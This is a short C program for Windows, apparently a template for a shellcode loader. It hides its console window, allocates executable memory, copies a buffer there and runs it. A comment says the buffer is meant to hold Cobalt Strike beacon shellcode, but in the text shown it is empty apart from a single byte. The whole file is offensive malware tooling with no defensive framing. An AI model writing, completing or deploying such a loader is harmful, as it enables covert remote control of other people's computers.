#include "Windows.h"

int main(int argc, char* argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// cobalt strike beacon shellcode x64
	unsigned char buf[] = "";


	char first[] = "\xfc";
	void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(buf, first, 1);
	memcpy(exec, buf, sizeof buf);
	((void(*)())exec)();

	return 0;
}
